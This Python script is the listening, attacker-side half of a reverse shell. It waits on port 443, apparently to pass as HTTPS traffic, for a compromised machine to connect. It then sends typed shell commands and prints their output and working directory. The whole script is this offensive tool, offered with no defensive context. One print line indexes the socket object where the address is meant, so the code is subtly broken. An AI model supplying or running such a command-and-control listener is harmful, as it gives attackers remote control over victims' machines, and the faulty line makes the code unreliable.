import socket

HOST = '0.0.0.0'
PORT = 443
Buffer_Size = 1024 * 128
Separator = "<sep>"
s = socket.socket()

s.bind((HOST,PORT))
s.listen(5)
print(f'listening as {HOST}:{PORT}...')

conn, addr = s.accept()
print(f'{conn[0]}:{addr[1]} connected!')

with conn:
    cwd = conn.recv(Buffer_Size).decode()
    while True:
        command = input(f'{cwd}$>')
        if not command.strip():
            continue
        conn.send(command.encode())
        if command.lower() == "exit":
            break
        output = conn.recv(Buffer_Size).decode()
        results, cwd = output.split(Separator)
        print(results)
s.close()